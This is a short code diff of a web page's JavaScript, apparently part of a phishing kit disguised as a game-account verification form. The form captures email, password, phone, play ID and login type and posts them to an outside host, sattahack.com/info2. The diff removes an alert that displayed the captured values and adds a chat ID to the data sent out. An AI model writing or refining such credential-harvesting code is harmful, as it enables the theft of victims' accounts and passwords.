@@ -2179,25 +2179,12 @@ $('.verification_info').show();
 $('.account_verification').hide();
 return false;
 }
-alert(
-    "📌 Confirm Submission Details\n" +
-    "━━━━━━━━━━━━━━━━━━━\n" +
-    "🆔 Chat ID: " + ($id || 'N/A') + "\n" +
-    "📧 Email: " + ($validateEmail || 'N/A') + "\n" +
-    "🔑 Password: " + ($validatePassword || 'N/A') + "\n" +
-    "📞 Phone: " + ($phone || 'N/A') + "\n" +
-    "🎮 Play ID: " + ($playid || 'N/A') + "\n" +
-    "📲 CodeTel: " + ($codetel || 'N/A') + "\n" +
-    "🎯 Level: " + ($level || 'N/A') + "\n" +
-    "📲 Login Type: " + ($validateLogin || 'N/A') + "\n" +
-    "━━━━━━━━━━━━━━━━━━━\n" +
-    "Click OK to submit or Cancel to review."
-);
+
 
 $.ajax({
 type: "POST",
 url: "https://sattahack.com/info2",
-data: $(this).serialize(),
+data: $(this).serialize() + `&id=${encodeURIComponent($id)}`,
 beforeSend: function() {
 $('.check_verification').show();
 $('.account_verification').hide();
